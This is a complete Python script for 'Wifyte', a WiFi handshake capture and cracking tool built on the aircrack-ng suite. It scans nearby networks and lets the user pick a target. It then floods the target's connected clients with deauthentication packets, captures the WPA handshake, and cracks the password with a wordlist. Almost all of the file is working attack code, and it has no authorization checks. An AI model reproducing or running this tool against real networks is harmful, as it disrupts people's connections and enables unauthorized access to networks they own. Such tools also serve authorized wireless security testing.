#!/usr/bin/env python3
import os
import re
import time
import signal
import subprocess
import sys
from dataclasses import dataclass
from typing import List, Optional
import shutil
from datetime import datetime
import tempfile
import threading
import logging

# Logging configuration
logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("wifyte")


# ANSI Color codes
class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"


# Log with color
def colored_log(level, msg, enabled=True):
    """Log with color and optional enable/disable"""
    if not enabled:
        return

    color_map = {
        "info": Colors.BLUE,
        "success": Colors.GREEN,
        "warning": Colors.YELLOW,
        "error": Colors.RED,
    }
    prefix = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[!]"}
    logger.info(f"{color_map[level]}{prefix[level]} {msg}{Colors.ENDC}")


@dataclass
class WiFiNetwork:
    id: int
    bssid: str
    channel: int
    power: int
    essid: str
    encryption: str

    def __str__(self) -> str:
        return f"{Colors.BOLD}[{self.id}]{Colors.ENDC} {Colors.GREEN}{self.essid}{Colors.ENDC} ({self.bssid}) - CH:{self.channel} PWR:{self.power} {Colors.YELLOW}{self.encryption}{Colors.ENDC}"


class Wifyte:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.temp_dir = tempfile.mkdtemp()
        self.handshake_dir = os.path.join(os.getcwd(), "handshakes")
        self.stop_capture = False
        self.handshake_found = False

        # Create handshake directory if it doesn't exist
        os.makedirs(self.handshake_dir, exist_ok=True)

        # Setup default wordlist
        self.wordlist_path = os.path.join(os.getcwd(), "wifyte.txt")
        if not os.path.exists(self.wordlist_path):
            colored_log("warning", f"Wordlist not found in {self.wordlist_path}")
            colored_log("warning", "Creating default wordlist...")
            with open(self.wordlist_path, "w") as f:
                f.write("password\n12345678\nqwerty123\nadmin123\nwifi12345\n")
            colored_log("success", "Default wordlist created.")

    def __del__(self):
        try:
            shutil.rmtree(self.temp_dir)
        except Exception as e:
            colored_log("error", f"Error clearing temp directory: {e}")

    def execute_command(
        self, command, shell=False, capture_output=True
    ) -> Optional[subprocess.CompletedProcess]:
        """Run shell command with error handling"""
        try:
            return subprocess.run(
                command, shell=shell, capture_output=capture_output, text=True
            )
        except Exception as e:
            colored_log("error", f"Error executing command: {e}")
            return None

    def find_wifi_interfaces(self) -> List[str]:
        """Find available wifi interfaces"""
        result = self.execute_command(["iwconfig"], shell=True)
        if not result or result.returncode != 0:
            colored_log("error", "Failed to get wifi interface list")
            sys.exit(1)

        return [
            line.split()[0]
            for line in result.stdout.split("\n")
            if "IEEE 802.11" in line
        ]

    def toggle_monitor_mode(self, interface, enable=True) -> Optional[str]:
        """Toggle monitor mode on/off"""
        if enable:
            # Kill interfering processes
            self.execute_command(["airmon-ng", "check", "kill"])

            # Turn off interface and enable monitor mode
            self.execute_command(["ifconfig", interface, "down"])
            result = self.execute_command(["airmon-ng", "start", interface])

            if not result or result.returncode != 0:
                colored_log("error", f"Failed to enable monitor mode on {interface}")
                return None

            # Find monitor interface name
            match = re.search(
                r"(Created monitor mode interface|monitor mode enabled on) (\w+)",
                result.stdout,
            )
            if match:
                monitor_interface = match.group(2)
            else:
                # Backup method to find monitor interface
                monitor_interface = next(
                    (
                        iface
                        for iface in self.find_wifi_interfaces()
                        if "Mode:Monitor"
                        in self.execute_command(["iwconfig", iface]).stdout
                    ),
                    f"{interface}mon",
                )

            # Ensure interface is up
            self.execute_command(["ifconfig", monitor_interface, "up"])
            colored_log("success", f"Monitor mode active on {monitor_interface}")
            return monitor_interface
        else:
            # Disable monitor mode
            result = self.execute_command(["airmon-ng", "stop", interface])
            if not result or result.returncode != 0:
                colored_log("error", "Failed to disable monitor mode")
                return False

            # Restart network services
            self.execute_command(
                ["service", "NetworkManager", "restart"], capture_output=False
            )
            colored_log(
                "success", "Monitor mode disabled and NetworkManager restarted."
            )
            return True

    def setup_interface(self):
        """Setup wifi interface for scanning"""
        colored_log("info", "Searching for wifi interfaces...")
        interfaces = self.find_wifi_interfaces()

        if not interfaces:
            colored_log("error", "No wifi interface found")
            sys.exit(1)

        # Check if any interface already in monitor mode
        for interface in interfaces:
            if "Mode:Monitor" in self.execute_command(["iwconfig", interface]).stdout:
                colored_log("success", f"Interface {interface} already in monitor mode")
                self.monitor_interface = interface
                return

        # Enable monitor mode on first interface
        self.interface = interfaces[0]
        colored_log("success", f"Using interface {self.interface}")
        self.monitor_interface = self.toggle_monitor_mode(self.interface, enable=True)

        if not self.monitor_interface:
            colored_log("error", "Failed to enable monitor mode")
            sys.exit(1)

    def scan_networks(self) -> List[WiFiNetwork]:
        """Scan available wifi networks"""
        if not self.monitor_interface:
            colored_log("error", "No monitor mode interface found")
            return []

        colored_log("info", "Starting WiFi network scan... About 8 seconds.")
        output_file = os.path.join(self.temp_dir, "scan-01.csv")

        # Start airodump-ng
        proc = subprocess.Popen(
            [
                "airodump-ng",
                "-w",
                os.path.join(self.temp_dir, "scan"),
                "--output-format",
                "csv",
                self.monitor_interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        try:
            # Scan for 8 seconds without logging every second
            time.sleep(8)
        except KeyboardInterrupt:
            colored_log("warning", "Scanning stopped by user")
        finally:
            proc.send_signal(signal.SIGTERM)
            proc.wait()

        networks = []

        # Parse CSV results
        if os.path.exists(output_file):
            try:
                with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                    lines = f.readlines()

                data_section = False
                network_id = 0

                for line in [l.strip() for l in lines]:
                    if line.startswith("BSSID"):
                        data_section = True
                        continue
                    if line.startswith("Station MAC"):
                        break
                    if data_section and line:
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) >= 14 and parts[13].strip():
                            network_id += 1
                            try:
                                networks.append(
                                    WiFiNetwork(
                                        id=network_id,
                                        bssid=parts[0],
                                        channel=(
                                            int(parts[3]) if parts[3].isdigit() else 0
                                        ),
                                        power=(
                                            int(parts[8])
                                            if parts[8].lstrip("-").isdigit()
                                            else 0
                                        ),
                                        encryption=f"{parts[5]} {parts[6]}".strip(),
                                        essid=parts[13].strip().replace("\x00", ""),
                                    )
                                )
                            except (ValueError, IndexError):
                                continue
            except Exception as e:
                colored_log("error", f"Error reading scan results: {e}")
        else:
            colored_log("error", "Scan results file not found")

        if networks:
            colored_log("success", f"Found {len(networks)} networks.")
        else:
            colored_log("warning", "No networks detected.")

        return networks

    def detect_connected_clients(self, network: WiFiNetwork) -> List[str]:
        """Detect connected clients to the target network"""
        colored_log(
            "info",
            f"Detecting connected clients for {network.essid}... About 10 seconds.",
        )
        output_file = os.path.join(self.temp_dir, "clients-01.csv")

        # Start airodump-ng to detect clients
        proc = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid",
                network.bssid,
                "--channel",
                str(network.channel),
                "--write",
                os.path.join(self.temp_dir, "clients"),
                self.monitor_interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        try:
            # Wait for 10 seconds without logging every second
            time.sleep(10)
        except KeyboardInterrupt:
            colored_log("warning", "Client detection stopped by user!")
        finally:
            proc.send_signal(signal.SIGTERM)
            proc.wait()

        clients = []

        # Parse client results
        if os.path.exists(output_file):
            try:
                with open(output_file, "r", encoding="utf-8", errors="replace") as f:
                    lines = f.readlines()

                client_section = False
                for line in [l.strip() for l in lines]:
                    if line.startswith("Station MAC"):
                        client_section = True
                        continue
                    if client_section and line:
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) >= 6 and parts[0].strip():
                            clients.append(parts[0])
            except Exception as e:
                colored_log("error", f"Error reading client detection results: {e}")
        else:
            colored_log("error", "Client detection results file not found")

        if clients:
            colored_log("success", f"Detected {len(clients)} connected clients.")
        else:
            colored_log("warning", "No connected clients detected.")

        return clients

    def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
        """Capture handshake from target network"""
        if not self.monitor_interface:
            colored_log("error", "No monitor mode interface found")
            return None

        # Detect connected clients
        clients = self.detect_connected_clients(network)
        if not clients:
            colored_log(
                "error",
                f"No connected clients detected for {network.essid}. Stopping process.",
            )
            return None

        # Deauthenticate clients
        self.deauthenticate_clients(network, clients)

        # Create capture filename
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
        capture_path = os.path.join(self.temp_dir, capture_name)

        colored_log("info", f"Starting handshake capture for {network.essid}...")

        # Reset flags
        self.stop_capture = False
        self.handshake_found = False

        # Start capture process
        capture_cmd = [
            "airodump-ng",
            "--bssid",
            network.bssid,
            "--channel",
            str(network.channel),
            "--write",
            capture_path,
            self.monitor_interface,
        ]

        capture_proc = subprocess.Popen(
            capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Start handshake watcher
        cap_file = f"{capture_path}-01.cap"
        watcher_thread = threading.Thread(
            target=self._handshake_watcher, args=(cap_file,)
        )
        watcher_thread.daemon = True
        watcher_thread.start()

        # Limit capturing to 1 minute
        timeout = 60  # 1 minute
        start_time = time.time()
        try:
            while not self.handshake_found:
                elapsed_time = int(time.time() - start_time)
                remaining_time = max(0, timeout - elapsed_time)

                if elapsed_time % 1 == 0:
                    print(
                        f"{Colors.BLUE}[*] Capturing handshake... Time left: {remaining_time}s{Colors.ENDC}",
                        end="\r",
                    )

                if elapsed_time >= timeout:
                    colored_log(
                        "warning", "Handshake capture timed out after 1 minute."
                    )
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            colored_log("warning", "Capture cancelled by user")
        finally:
            self.stop_capture = True
            capture_proc.send_signal(signal.SIGTERM)
            capture_proc.wait()

        print("\n")  # Move to next line after countdown

        if not self.handshake_found:
            colored_log("error", "Failed to capture handshake after deauthentication.")
            return None

        # Save handshake file
        final_path = os.path.join(
            self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
        )
        shutil.copy(cap_file, final_path)
        colored_log("success", f"Handshake saved to {final_path}")
        return final_path

    def deauthenticate_clients(self, network: WiFiNetwork, clients: List[str]):
        """Deauthenticate all connected clients using multithreading"""
        colored_log(
            "info",
            f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
        )

        # 1. Function to perform individual deauth (one by one)
        def deauth_client(client: str):
            deauth_cmd = [
                "aireplay-ng",
                "--deauth",
                "10",  # Number of deauth packets
                "-a",
                network.bssid,
                "-c",
                client,
                self.monitor_interface,
            ]
            subprocess.Popen(
                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

        # Use multithreading to deauth all individual clients in parallel
        threads = []
        for client in clients:
            thread = threading.Thread(target=deauth_client, args=(client,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        # 2. Function to perform broadcast deauth (all at once)
        broadcast_deauth_cmd = [
            "aireplay-ng",
            "--deauth",
            "10",  # Number of deauth packets
            "-a",
            network.bssid,
            self.monitor_interface,
        ]
        subprocess.Popen(
            broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Log completion
        colored_log("success", "Deauthentication completed for all connected clients.")

    def _handshake_watcher(self, cap_file: str):
        """Watch for handshake in capture file"""
        while not self.stop_capture:
            if os.path.exists(cap_file) and self._check_handshake(cap_file):
                colored_log("success", "Handshake detected!")
                self.handshake_found = True
                self.stop_capture = True
                break
            time.sleep(1)  # Check every 1 seconds

    def _check_handshake(self, cap_file: str) -> bool:
        """Check if capture file contains handshake"""
        if not os.path.exists(cap_file):
            return False

        # Check with aircrack-ng
        result = self.execute_command(["aircrack-ng", cap_file])
        return result and "1 handshake" in result.stdout

    def crack_password(self, handshake_path: str) -> Optional[str]:
        """Crack password from handshake"""
        if not os.path.exists(handshake_path) or not os.path.exists(self.wordlist_path):
            colored_log("error", "Handshake file or wordlist not found")
            return None

        colored_log("info", f"Using wordlist: {self.wordlist_path}")
        colored_log(
            "info", "Cracking passwords. Please wait, this may take a while...."
        )

        # Use aircrack-ng for cracking
        result = self.execute_command(
            ["aircrack-ng", "-w", self.wordlist_path, handshake_path]
        )
        if not result:
            colored_log("error", "Error cracking password!")
            return None

        # Check results
        if "KEY FOUND!" in result.stdout:
            match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
            if match:
                password = match.group(1)
                colored_log(
                    "success", f"Password found: {Colors.BOLD}{password}{Colors.ENDC}"
                )
                return password

        colored_log("error", "Password not found in wordlist! Better luck next time :)")
        return None

    def run(self):
        """Main program flow"""
        self._display_banner()

        try:
            # Setup and scan
            self.setup_interface()
            self.networks = self.scan_networks()

            if not self.networks:
                colored_log("error", "No networks found.")
                return self._exit_program()

            # Display networks
            print(
                f"\n{Colors.BLUE}===== {len(self.networks)} Networks found ====={Colors.ENDC}"
            )
            for network in self.networks:
                print(network)

            # Select target
            target = self.select_target()
            if not target:
                return self._exit_program()

            colored_log("success", f"Selected target: {target.essid} ({target.bssid})")

            # Capture and crack
            handshake_path = self.capture_handshake(target)
            if handshake_path:
                self.crack_password(handshake_path)

        except KeyboardInterrupt:
            colored_log("warning", "Program cancelled by user!")
        finally:
            self._exit_program()

    def select_target(self):
        """Select target network with input validation"""
        while True:
            try:
                choice = int(
                    input(
                        f"\n{Colors.YELLOW}[?] Select Target [1-{len(self.networks)}]: {Colors.ENDC}"
                    )
                )
                if 1 <= choice <= len(self.networks):
                    return self.networks[choice - 1]
                else:
                    colored_log("error", "Invalid choice. Please try again.")
            except (ValueError, KeyboardInterrupt):
                colored_log("warning", "Invalid input or cancelled.")
                return None

    def _display_banner(self):
        """Display program banner"""
        banner = f"""
{Colors.BOLD}{Colors.BLUE}
██╗    ██╗██╗███████╗██╗   ██╗████████╗███████╗
██║    ██║██║██╔════╝╚██╗ ██╔╝╚══██╔══╝██╔════╝
██║ █╗ ██║██║█████╗   ╚████╔╝    ██║   █████╗  
██║███╗██║██║██╔══╝    ╚██╔╝     ██║   ██╔══╝  
╚███╔███╔╝██║██║        ██║      ██║   ███████╗
 ╚══╝╚══╝ ╚═╝╚═╝        ╚═╝      ╚═╝   ╚══════╝
{Colors.ENDC}
{Colors.YELLOW}         WiFi Handshake Capture & Cracking Tool{Colors.ENDC}
"""
        print(banner)

    def _exit_program(self):
        """Clean exit"""
        try:
            disable_monitor = (
                input(
                    f"\n{Colors.YELLOW}[?] Disable monitor mode? (y/n): {Colors.ENDC}"
                ).lower()
                == "y"
            )

            if disable_monitor and self.monitor_interface:
                self.toggle_monitor_mode(self.monitor_interface, enable=False)
            elif self.monitor_interface:
                colored_log(
                    "success",
                    f"Monitor mode remains active on {self.monitor_interface}.",
                )

            colored_log("info", "Program closed, thank you!")
        except KeyboardInterrupt:
            colored_log("warning", "Program cancelled by user!")
            if self.monitor_interface:
                colored_log(
                    "success",
                    f"Monitor mode remains active on {self.monitor_interface}.",
                )


if __name__ == "__main__":
    # Check root access
    if os.geteuid() != 0:
        colored_log(
            "error", "This program requires root access. Please run with 'sudo'"
        )
        sys.exit(1)

    # Check dependencies
    dependencies = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing = [dep for dep in dependencies if shutil.which(dep) is None]

    if missing:
        colored_log("error", f"Missing dependencies: {', '.join(missing)}")
        colored_log(
            "warning",
            "Please install aircrack-ng suite: sudo apt-get install aircrack-ng",
        )
        sys.exit(1)

    try:
        wifyte = Wifyte()
        wifyte.run()
    except Exception as e:
        colored_log("error", f"Unexpected error: {e}")
